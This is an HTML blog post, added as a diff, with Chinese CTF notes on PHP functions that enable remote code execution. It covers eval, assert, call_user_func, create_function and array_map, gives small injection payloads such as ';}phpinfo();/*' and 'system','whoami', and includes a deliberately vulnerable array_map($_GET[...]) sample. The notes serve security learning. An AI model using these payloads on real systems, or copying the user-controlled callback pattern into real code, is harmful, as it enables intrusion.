@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="php代码&#x2F;命令执行漏洞 | Chybeta PHP preg_系列漏洞小结 | 国光 代码执行函数${} 用于复杂的变量解析，通常在字符串内用来解析变量或表达式。可以配合 eval 或其他动态执行代码的功能，用于间接执行代码。 PHP: 可变变量 - Manual  123&lt;?php 	$&#123;phpinfo()&#125;;?&gt;  eval() eval — 把字符">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCE-PHP函数">
+<meta property="og:url" content="http://example.com/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="php代码&#x2F;命令执行漏洞 | Chybeta PHP preg_系列漏洞小结 | 国光 代码执行函数${} 用于复杂的变量解析，通常在字符串内用来解析变量或表达式。可以配合 eval 或其他动态执行代码的功能，用于间接执行代码。 PHP: 可变变量 - Manual  123&lt;?php 	$&#123;phpinfo()&#125;;?&gt;  eval() eval — 把字符">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-01-28T10:33:43.000Z">
+<meta property="article:modified_time" content="2026-01-28T10:44:32.271Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="RCE">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>RCE-PHP函数</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Hexo" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/lierbushiwo">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2026/01/28/bash%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6rce/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/&text=RCE-PHP函数"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/&title=RCE-PHP函数"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/&is_video=false&description=RCE-PHP函数"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RCE-PHP函数&body=Check out this article: http://example.com/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/&title=RCE-PHP函数"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/&title=RCE-PHP函数"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/&title=RCE-PHP函数"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/&title=RCE-PHP函数"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/&name=RCE-PHP函数&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/&t=RCE-PHP函数"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">代码执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">${}</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eval"><span class="toc-number">1.2.</span> <span class="toc-text">eval()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#assert"><span class="toc-number">1.3.</span> <span class="toc-text">assert()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.4.</span> <span class="toc-text">函数参数代码执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0"><span class="toc-number">1.5.</span> <span class="toc-text">函数处理函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#call-user-func"><span class="toc-number">1.5.1.</span> <span class="toc-text">call_user_func()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#call-user-func-array"><span class="toc-number">1.5.2.</span> <span class="toc-text">call_user_func_array</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#create-function"><span class="toc-number">1.5.3.</span> <span class="toc-text">create_function()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.6.</span> <span class="toc-text">数组函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#array-map"><span class="toc-number">1.6.1.</span> <span class="toc-text">array_map()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#usort"><span class="toc-number">1.6.2.</span> <span class="toc-text">usort()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#uasort"><span class="toc-number">1.6.3.</span> <span class="toc-text">uasort()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#uksort"><span class="toc-number">1.6.4.</span> <span class="toc-text">uksort()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#array-filter"><span class="toc-number">1.6.5.</span> <span class="toc-text">array_filter()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#array-reduce"><span class="toc-number">1.6.6.</span> <span class="toc-text">array_reduce()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#preg-replace"><span class="toc-number">1.7.</span> <span class="toc-text">preg_replace()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ob-start"><span class="toc-number">1.8.</span> <span class="toc-text">ob_start()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">命令执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#system"><span class="toc-number">2.1.</span> <span class="toc-text">system()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#passthru"><span class="toc-number">2.2.</span> <span class="toc-text">passthru()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shell-exec"><span class="toc-number">2.3.</span> <span class="toc-text">shell_exec()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exec"><span class="toc-number">2.4.</span> <span class="toc-text">exec()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pcntl-exec"><span class="toc-number">2.5.</span> <span class="toc-text">pcntl_exec()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#popen"><span class="toc-number">2.6.</span> <span class="toc-text">popen()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proc-open"><span class="toc-number">2.7.</span> <span class="toc-text">proc_open()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3%E6%89%A9%E5%B1%95"><span class="toc-number">3.</span> <span class="toc-text">文件系统相关扩展</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.</span> <span class="toc-text">目录函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#chdir"><span class="toc-number">3.1.1.</span> <span class="toc-text">chdir()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#scandir"><span class="toc-number">3.1.2.</span> <span class="toc-text">scandir()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.</span> <span class="toc-text">读写文件函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#file"><span class="toc-number">3.2.1.</span> <span class="toc-text">file()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#file-get-contents"><span class="toc-number">3.2.2.</span> <span class="toc-text">file_get_contents()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#file-put-contents"><span class="toc-number">3.2.3.</span> <span class="toc-text">file_put_contents()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#readfile"><span class="toc-number">3.2.4.</span> <span class="toc-text">readfile()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#readgzfile"><span class="toc-number">3.2.5.</span> <span class="toc-text">readgzfile()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E5%87%BD%E6%95%B0"><span class="toc-number">4.</span> <span class="toc-text">敏感信息函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phpinfo"><span class="toc-number">4.1.</span> <span class="toc-text">phpinfo()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getenv"><span class="toc-number">4.2.</span> <span class="toc-text">getenv()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getcwd"><span class="toc-number">4.3.</span> <span class="toc-text">getcwd()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpversion"><span class="toc-number">4.4.</span> <span class="toc-text">phpversion()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-loaded-extensions"><span class="toc-number">4.5.</span> <span class="toc-text">get_loaded_extensions()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">5.</span> <span class="toc-text">环境变量相关函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#putenv"><span class="toc-number">5.1.</span> <span class="toc-text">putenv()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E4%B8%8D%E9%9C%80%E8%A6%81%E6%8B%AC%E5%8F%B7%E7%9A%84%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0-%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">6.</span> <span class="toc-text">php不需要括号的敏感函数&#x2F;关键字</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        RCE-PHP函数
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-01-28T10:33:43.000Z" class="dt-published" itemprop="datePublished">2026-01-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/PHP/" rel="tag">PHP</a>, <a class="p-category" href="/tags/RCE/" rel="tag">RCE</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">php代码&#x2F;命令执行漏洞 | Chybeta</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/07/preg_replace.html">PHP preg_系列漏洞小结 | 国光</a></p>
+<h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h2><h3 id=""><a href="#" class="headerlink" title="${}"></a>${}</h3><blockquote>
+<p>用于复杂的变量解析，通常在字符串内用来解析变量或表达式。可以配合 <code>eval</code> 或其他动态执行代码的功能，用于间接执行代码。</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.variables.variable.php">PHP: 可变变量 - Manual</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><blockquote>
+<p>eval — 把字符串作为PHP代码执行</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.eval.php">https://www.php.net/manual/zh/function.eval.php</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="keyword">string</span> <span class="variable">$code</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>代码不能包含打开&#x2F;关闭 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.basic-syntax.phpmode.php">PHP tags</a>。比如， <code>&#39;echo &quot;Hi!&quot;;&#39;</code> 不能这样传入： <code>&#39;&lt;?php echo &quot;Hi!&quot;; ?&gt;&#39;</code>。但仍然可以用合适的 PHP tag 来离开、重新进入 PHP 模式。比如 <code>&#39;echo &quot;In PHP mode!&quot;; ?&gt;In HTML mode!&lt;?php echo &quot;Back in PHP mode!&quot;;&#39;</code>。</li>
+<li>传入的必须是有效的 PHP 代码。所有的语句必须以分号结尾。</li>
+<li><code>return</code> 语句会立即中止当前字符串的执行。</li>
+<li>代码执行的作用域是调用 <strong>eval()</strong> 处的作用域。因此，<strong>eval()</strong> 里任何的变量定义、修改，都会在函数结束后被保留。</li>
+<li>实际上，eval() 是语言构造器而不是函数，<strong>不能在 php.ini 中使用 disable_fucntions 来禁用</strong>，若要禁用需要用到PHP的扩展Suhosin。而且不能被 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/functions.variable-functions.php">可变函数</a> 或者 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/functions.arguments.php#functions.named-arguments">命名参数</a> 调用，即 <code>$a=&quot;eval&quot;;$a();</code> 是不可行的</li>
+</ul>
+<h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><blockquote>
+<p>assert — 断言检测</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.assert.php">https://www.php.net/manual/zh/function.assert.php</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="keyword">mixed</span> <span class="variable">$assertion</span>, <span class="built_in">Throwable</span>|<span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$description</span> = <span class="literal">null</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>在 PHP 8.0.0 之前，如果 <code>assertion</code> 是 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.string.php">string</a>，将解释为 PHP 代码，并通过 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.eval.php">eval()</a> 执行。这个字符串将作为第三个参数传递给回调函数。这种行为在 PHP 7.2.0 中<em>弃用</em>，并在 PHP 8.0.0 中<em>移除</em>。</p>
+</li>
+<li><table>
+<thead>
+<tr>
+<th align="left">版本</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">8.3.0</td>
+<td align="left">弃用所有的 <code>assert.</code> INI 设置。</td>
+</tr>
+<tr>
+<td align="left">8.0.0</td>
+<td align="left"><strong>assert()</strong> 将不再对字符串参数求值，而是跟其他参数一样对待。应该使用 <code>assert($a == $b)</code> 替代 <code>assert(&#39;$a == $b&#39;)</code>。已移除 <code>assert.quiet_eval</code> php.ini 指令和 <strong><code>ASSERT_QUIET_EVAL</code></strong> 常量，因为它们不再有任何作用。</td>
+</tr>
+<tr>
+<td align="left">8.0.0</td>
+<td align="left">如果 <code>description</code> 是 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.throwable.php">Throwable</a> 的实例，无论 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/info.configuration.php#ini.assert.exception">assert.exception</a> 的值如何，如果断言失败，该对象都会被抛出。</td>
+</tr>
+<tr>
+<td align="left">8.0.0</td>
+<td align="left">如果 <code>description</code> 是 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.throwable.php">Throwable</a> 的实例，即使设置了用户回调，也不会调用该回调。</td>
+</tr>
+<tr>
+<td align="left">8.0.0</td>
+<td align="left">不再允许在命名空间中声明叫做 <code>assert()</code> 的函数，并发出 <strong><code>E_COMPILE_ERROR</code></strong>。</td>
+</tr>
+<tr>
+<td align="left">7.3.0</td>
+<td align="left">弃用在命名空间中声明 <code>assert()</code> 函数。这样声明会发出 <strong><code>E_DEPRECATED</code></strong>。</td>
+</tr>
+<tr>
+<td align="left">7.2.0</td>
+<td align="left">弃用使用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.string.php">string</a> 作为 <code>assertion</code>。当 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/info.configuration.php#ini.assert.active">assert.active</a> 和 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ini.core.php#ini.zend.assertions">zend.assertions</a> 都设为 <code>1</code> 时，现在会发出 <strong><code>E_DEPRECATED</code></strong> 通知。</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<h3 id="函数参数代码执行"><a href="#函数参数代码执行" class="headerlink" title="函数参数代码执行"></a>函数参数代码执行</h3><p>关键在于：<strong>PHP 是表达式语言，函数调用本身就是表达式，会先求值再传参。</strong></p>
+<p>在 PHP（以及大多数编程语言）中，<strong>函数的参数会在调用外层函数之前被计算（求值）</strong>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">exit</span>(<span class="title function_ invoke__">var_dump</span>(<span class="number">1</span>));</span><br><span class="line"><span class="keyword">int</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="函数处理函数"><a href="#函数处理函数" class="headerlink" title="函数处理函数"></a>函数处理函数</h3><h4 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h4><blockquote>
+<p>call_user_func — 把第一个参数作为回调函数调用</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.call-user-func.php">https://www.php.net/manual/zh/function.call-user-func.php</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> ...<span class="variable">$args</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&quot;system&quot;</span>,<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array"></a>call_user_func_array</h4><blockquote>
+<p>call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.call-user-func-array.php">https://www.php.net/manual/zh/function.call-user-func-array.php</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">array</span> <span class="variable">$args</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&quot;system&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;whoami&quot;</span>))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h4><blockquote>
+<p>create_function — 通过执行代码字符串创建动态函数</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.create-function.php">https://www.php.net/manual/zh/function.create-function.php</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="keyword">string</span> <span class="variable">$args</span>, <span class="keyword">string</span> <span class="variable">$code</span>): <span class="keyword">string</span></span><br><span class="line"><span class="comment">//string $args 声明的函数变量部分（不声明的话就是无参函数）</span></span><br><span class="line"><span class="comment">//string $code 执行的方法代码部分</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>创建全局匿名函数（无法释放），并为其返回唯一名称。这个函数的名称中有不可见字符，在url编码后为<code>%00lambda_{id}</code>，其中 id 为该进程内创建的第几个匿名函数，如第二个匿名函数即为 <code>%00lambda_2</code></li>
+<li>PHP7.2 开始被废弃但仍可使用，PHP8 被移除</li>
+<li>此函数会在内部执行 eval()，因此具有和 eval() 一样的风险</li>
+<li>$code参数是我们可控输入的，可以使用<code>;}</code>在此处提前闭合这个匿名函数，然后注入我们的 php 代码，最后用<code>/*</code>把后面的内容注释掉</li>
+</ul>
+<blockquote>
+<p>匿名函数的函数名是会改变的！在web页面中打开php文件，每刷新一次函数名的数字就会加一，<code>\000lambda_1</code>只是第一次访问题目环境时匿名函数的名字，所以最好是重新开启一个环境来提交payload</p>
+</blockquote>
+<p>eg:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;;&#125;phpinfo();/*&quot;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="数组函数"><a href="#数组函数" class="headerlink" title="数组函数"></a>数组函数</h3><h4 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h4><blockquote>
+<p>array_map — 为数组的每个元素应用回调函数</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.array-map.php">https://www.php.net/manual/zh/function.array-map.php</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_map</span>(?<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">array</span> <span class="variable">$array</span>, <span class="keyword">array</span> ...<span class="variable">$arrays</span>): <span class="keyword">array</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>array_map()</strong> 返回一个 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.array.php">array</a>，包含将 <code>array</code> 的相应值作为回调的参数顺序调用 <code>callback</code> 后的结果（如果提供了更多数组，还会利用 <code>arrays</code> 传入）。<code>callback</code> 函数形参的数量必须匹配 <strong>array_map()</strong> 实参中数组的数量。多余的实参数组将会被忽略。如果提供的实参数组的数量不足，将抛出 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.argumentcounterror.php">ArgumentCountError</a>。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$array</span> = <span class="keyword">array</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">	<span class="title function_ invoke__">array_map</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;chybeta&#x27;</span>],<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//?chybeta=phpinfo</span></span><br></pre></td></tr></table></figure>
